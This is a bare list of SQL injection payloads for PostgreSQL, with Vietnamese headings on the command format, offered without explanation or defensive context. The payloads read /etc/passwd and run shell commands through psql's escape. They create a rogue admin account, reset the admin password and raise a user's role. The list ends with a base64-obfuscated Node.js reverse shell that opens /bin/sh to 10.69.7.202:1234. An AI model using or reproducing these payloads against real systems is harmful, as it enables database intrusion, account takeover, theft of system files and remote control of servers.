¿'; CREATE TEMP TABLE out(content text); COPY out FROM '/etc/passwd'; SELECT content FROM out; --
¿'; \! id ; #
¿'; \! cat /etc/passwd; #

*** FORMAT lệnh: ***
- postgresql : ¿'; + các lệnh độc --
- psql : ¿'; \! các lệnh độc #

¿'; INSERT INTO users (username, password, role, email) VALUES ('hacker12', 'pwned', 'admin', 'hacker12@fcode.org'); --
¿'; UPDATE users SET password = '123' WHERE username = 'admin'; --
¿'; UPDATE users SET role = 'admin' WHERE username = 'hacker12'; --

*** reverse shell:***
¿'; \! node -e "eval(Buffer.from
('CmNvbnN0IG5ldD1yZXF1aXJlKCduZXQnKSx7c3Bhd259PXJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKSxjbGllbnQ9bmV3IG5ldC5Tb2NrZXQoKTsKY2xpZW50LmNvbm5lY3QoMTIzNCwnMTAuNjkuNy4yMDInLCgpPT57CiAgICBjb25zdCBzPXNwYXduKCcvYmluL3NoJyxbXSx7c2hlbGw6dHJ1ZX0pOwogICAgY2xpZW50LnBpcGUocy5zdGRpbik7CiAgICBzLnN0ZG91dC5waXBlKGNsaWVudCk7CiAgICBzLnN0ZGVyci5waXBlKGNsaWVudCk7Cn0pOw==','base64').toString())" #